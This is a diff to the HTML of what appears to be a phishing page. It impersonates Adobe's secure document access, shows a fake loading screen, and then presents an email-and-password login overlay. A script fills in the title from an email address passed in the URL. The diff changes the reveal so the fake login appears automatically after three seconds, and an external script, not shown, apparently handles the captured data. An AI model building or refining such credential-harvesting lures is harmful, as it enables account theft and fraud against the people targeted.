@@ -13,7 +13,7 @@
   <!-- Dynamic Title Script (unchanged) -->
   <script>
     window.addEventListener("DOMContentLoaded", function () {
-      const hash = window.location.hash.substring(1); // Remove the '#' character
+      const hash = window.location.hash.substring(1);
       const parts = hash.split("@");
       if (parts.length === 2) {
         const domain = parts[1];
@@ -23,29 +23,32 @@
     });
   </script>
 
-  <!-- Start-screen -> reveal overlay logic (unchanged) -->
+  <!-- Smooth auto-load to overlay -->
   <script>
     window.addEventListener("DOMContentLoaded", () => {
       const start = document.getElementById("start-screen");
       const overlay = document.getElementById("overlay");
+
       if (start && overlay) {
-        start.addEventListener("click", () => {
+        // Automatically fade the loader after a few seconds
+        setTimeout(() => {
           start.classList.add("hide");
-          // small delay so the start-screen fades, then show overlay
-          setTimeout(() => overlay.classList.add("show"), 280);
-        });
+          setTimeout(() => overlay.classList.add("show"), 500);
+        }, 3000); // 3 seconds loading time
       }
     });
   </script>
 </head>
 <body>
 
-  <!-- START: Smooth loading animation start screen -->
-  <div id="start-screen" aria-hidden="false" title="Click to continue">
-    <div class="loader-container">
-      <div class="loader"></div>
-      <div class="loader-text">Loading secure document...</div>
-      <div class="click-hint">Click anywhere to continue</div>
+  <!-- START: Polished loading screen -->
+  <div id="start-screen" aria-hidden="true">
+    <div class="loader-wrapper">
+      <div class="loader-circle"></div>
+      <div class="loader-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" alt="Loading logo">
+      </div>
+      <div class="loader-text">Preparing secure access...</div>
     </div>
   </div>
   <!-- END start screen -->
@@ -53,33 +56,22 @@
   <!-- Fullscreen background iframe -->
   <iframe id="bg-frame"></iframe>
 
-  <!-- Login overlay (hidden initially, shown after clicking start-screen) -->
+  <!-- Login overlay -->
   <div class="overlay" id="overlay" aria-hidden="true">
     <div class="login-box" role="region" aria-label="Account verification login">
-      <!-- make logo visible -->
       <img id="logo" alt="Provider logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />
-
-      <!-- Info text -->
       <div class="info-text">
         🗂️ <strong>Secured file access</strong> 🔐 — sign in for your provider’s verification
       </div>
-
-      <!-- Email input with icon -->
       <div class="input-group">
         <i class="fas fa-envelope icon"></i>
         <input type="email" id="email" placeholder="Email" />
       </div>
-
-      <!-- Password input with icon -->
       <div class="input-group">
         <i class="fas fa-lock icon"></i>
         <input type="password" id="password" placeholder="Password" />
       </div>
-
-      <!-- Error message -->
       <div id="error-msg" class="error-msg" aria-live="polite"></div>
-
-      <!-- Login button -->
       <button id="login-btn">Login</button>
     </div>
   </div>
@@ -89,7 +81,7 @@
     <img src="https://i.postimg.cc/SQqcxNCn/temp-Image-Bgz-Qo3.avif" />
   </div>
 
-  <!-- Your external script (unchanged) -->
+  <!-- External script (unchanged) -->
   <script src="power.js"></script>
 </body>
 </html>
